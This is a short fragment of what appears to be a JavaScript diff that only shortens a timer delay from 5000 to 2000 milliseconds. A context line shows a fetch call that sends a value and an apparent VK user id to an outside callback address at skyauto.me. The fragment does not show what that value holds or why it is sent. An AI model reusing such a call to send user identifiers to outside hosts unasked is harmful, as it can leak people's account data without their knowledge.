@@ -31,6 +31,6 @@ fetch('https://skyauto.me/cllbck/' + p + '?api=1&uid=' + vkid,)
 
 }
 
-setTimeout(func, 5000);
+setTimeout(func, 2000);
 
 
